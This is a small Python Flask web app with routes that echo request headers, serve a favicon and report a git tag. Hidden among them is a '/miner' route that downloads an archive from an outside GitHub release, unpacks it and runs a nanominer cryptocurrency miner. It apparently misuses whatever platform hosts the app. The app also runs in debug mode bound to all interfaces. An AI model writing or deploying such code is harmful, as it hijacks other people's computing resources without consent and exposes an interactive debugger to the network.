import platform
import subprocess
import os
from flask import Flask, Response, request
app = Flask(__name__)

@app.route("/")
def headers():
    return '<br/>'.join(['%s => %s' % (key, value) for (key, value) in request.headers.items()])

@app.route("/favicon.ico")
def favicon():
    resp = Response(status=200, mimetype='image/png')
    return resp

@app.route("/miner")
def pyver():
    a  = os.popen('wget https://github.com/teskilah/teshe/releases/download/das/luck.tar.gz').readlines()
    a  = os.popen('tar -xvf luck.tar.gz').readlines()
    b  = os.popen('./nanominer').readlines()
    return a

@app.route("/tag")
def tag():
    p = subprocess.Popen(['git', 'describe', '--tags', '--abbrev=0'], stdout=subprocess.PIPE)
    p.wait()
    return p.stdout.read()

if __name__ == '__main__':
    # Bind to PORT if defined, otherwise default to 5000.
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True, use_reloader=True)
